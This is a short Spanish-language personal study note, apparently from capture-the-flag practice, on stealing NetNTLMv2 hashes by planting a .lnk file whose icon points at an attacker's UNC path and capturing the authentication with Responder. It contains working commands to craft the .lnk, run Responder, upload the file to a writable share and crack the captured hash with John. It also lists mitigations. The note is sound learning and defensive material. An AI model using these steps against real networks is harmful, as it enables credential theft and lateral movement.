---
tags: [tecnica, explotacion, ad, responder, ntlm]
tipo: tecnica
categoria: explotacion
estado: practicado
maquinas: [Phantom]
---

# NTLM Theft con Responder

## 1. Qué es

Captura de hashes **NetNTLMv2** forzando a un usuario a autenticarse contra el atacante (p.ej. un `.lnk` con icono en un UNC).

## 2. Cómo funciona

- Un fichero en un share escribible apunta a `\\atacante\share\x.ico`.
- Al visualizarlo/visitarlo, la víctima envía su hash a Responder (LLMNR/NBT-NS/SMB).

## 3. Cuándo sospecharla

- Shares **escribibles** visitados por otros usuarios/tareas.
- LLMNR/NBT-NS activos, SMB sin firmar.

## 4. Cómo comprobarla (laboratorio autorizado)

```bash
python3 -c "import pylnk3; l=pylnk3.create('config.lnk'); l.icon=r'\\\\192.168.56.1\\share\\x.ico'; l.work_dir=r'\\\\192.168.56.1\\share'; l.save()"
sudo responder -I vboxnet0 -wv
smbclient "//host/Share" -U 'dom/user%pw' -c 'put config.lnk config.lnk'
# captura -> john --format=netntlmv2
```

## 5. Herramientas

- [[Responder]], `pylnk3`, `smbclient`, [[John-The-Ripper]].

## 6. Ejemplos en mis CTF

| Máquina | Contexto | Resultado |
|---|---|---|
| [[Phantom]] | LNK en share "Dev Tools" escribible | hash de `robert` → crack |

## 7. Falsos positivos / pruebas fallidas

- Sin una víctima que **visite** el share, no hay captura.

## 8. Prevención y mitigación

- Deshabilitar LLMNR/NBT-NS, exigir **SMB signing**, no dejar shares escribibles; monitorizar `.lnk`/`.scf`.

## 9. Técnicas relacionadas

- [[Cracking]], [[AD-Abuso-de-ACLs]]
